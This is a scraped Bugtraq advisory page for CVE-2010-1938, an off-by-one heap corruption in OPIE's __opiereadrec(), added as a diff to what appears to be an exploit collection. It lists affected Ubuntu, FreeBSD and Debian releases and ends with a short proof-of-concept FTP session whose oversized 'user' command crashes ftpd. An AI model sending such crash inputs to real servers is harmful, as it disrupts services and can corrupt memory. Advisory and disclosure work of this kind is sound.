@@ -1,0 +1,232 @@
+#SpeeDr00t@Black Falcon<br>#bid40403<p><b><span style="font-size: 18pt;">OPIE '__opiereadrec()' Off By One Heap Memory Corruption Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/40403/info">info</a><br><a href="http://www.securityfocus.com/bid/40403/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/40403/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/40403/solution">solution</a><br><a href="http://www.securityfocus.com/bid/40403/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				40403
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2010-1938<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 27 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 22 2011 05:30PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Maksymilian Arciemowicz and Adam 'pi3' Zabrocki
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Ubuntu Ubuntu Linux  9.10 sparc<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.10 powerpc<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.10 lpia<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.10 i386<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.10 amd64<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.04 sparc<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.04 powerpc<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.04 lpia<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.04 i386<br/>
+					
+				
+					Ubuntu Ubuntu Linux  9.04 amd64<br/>
+					
+				
+					Ubuntu Ubuntu Linux  10.04 sparc<br/>
+					
+				
+					Ubuntu Ubuntu Linux  10.04 powerpc<br/>
+					
+				
+					Ubuntu Ubuntu Linux  10.04 i386<br/>
+					
+				
+					Ubuntu Ubuntu Linux  10.04 amd64<br/>
+					
+				
+					FreeBSD FreeBSD  8.1-PRERELEASE<br/>
+					
+				
+					FreeBSD FreeBSD  8.0-STABLE<br/>
+					
+				
+					FreeBSD FreeBSD  8.0-RELEASE<br/>
+					
+				
+					FreeBSD FreeBSD  7.3-STABLE<br/>
+					
+				
+					FreeBSD FreeBSD  7.3-RELEASE-p1<br/>
+					
+				
+					FreeBSD FreeBSD  7.2-STABLE<br/>
+					
+				
+					FreeBSD FreeBSD  7.2-RELEASE-p4<br/>
+					
+				
+					FreeBSD FreeBSD  7.2-RELEASE-p1<br/>
+					
+				
+					FreeBSD FreeBSD  7.2-RC2<br/>
+					
+				
+					FreeBSD FreeBSD  7.2-PRERELEASE<br/>
+					
+				
+					FreeBSD FreeBSD  7.1-STABLE<br/>
+					
+				
+					FreeBSD FreeBSD  7.1-RELEASE-p6<br/>
+					
+				
+					FreeBSD FreeBSD  7.1-RELEASE-p5<br/>
+					
+				
+					FreeBSD FreeBSD  7.1-RELEASE-p4<br/>
+					
+				
+					FreeBSD FreeBSD  7.1 -RELEASE-p2<br/>
+					
+				
+					FreeBSD FreeBSD  7.1 -RELEASE-p1<br/>
+					
+				
+					FreeBSD FreeBSD  7.1 -PRE-RELEASE<br/>
+					
+				
+					FreeBSD FreeBSD  6.4-RELENG<br/>
+					
+				
+					FreeBSD FreeBSD  6.4-RELEASE-p5<br/>
+					
+				
+					FreeBSD FreeBSD  6.4-RELEASE-p4<br/>
+					
+				
+					FreeBSD FreeBSD  6.4-RELEASE-p2<br/>
+					
+				
+					FreeBSD FreeBSD  6.4 -STABLE<br/>
+					
+				
+					FreeBSD FreeBSD  6.4 -RELEASE-p3<br/>
+					
+				
+					FreeBSD FreeBSD  6.4 -RELEASE<br/>
+					
+				
+					Debian Linux  6.0 sparc<br/>
+					
+				
+					Debian Linux  6.0 s/390<br/>
+					
+				
+					Debian Linux  6.0 powerpc<br/>
+					
+				
+					Debian Linux  6.0 mips<br/>
+					
+				
+					Debian Linux  6.0 ia-64<br/>
+					
+				
+					Debian Linux  6.0 ia-32<br/>
+					
+				
+					Debian Linux  6.0 arm<br/>
+					
+				
+					Debian Linux  6.0 amd64<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker may exploit this issue by enticing a victim into connecting to a malicious server.<br/><br/>The following proof-of-concept demonstrating this issue against the ftpd process on FreeBSD is available:<br/><br/>Connected to localhost.<br/> Escape character is '^'.<br/> 220 127.cx FTP server (Version 6.00LS) ready.<br/> user cx<br/> 331 Password required for cx.<br/> user AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br/> Connection closed by foreign host.<br/> 127#
+	
+		<ul>
+</ul>
+</div>
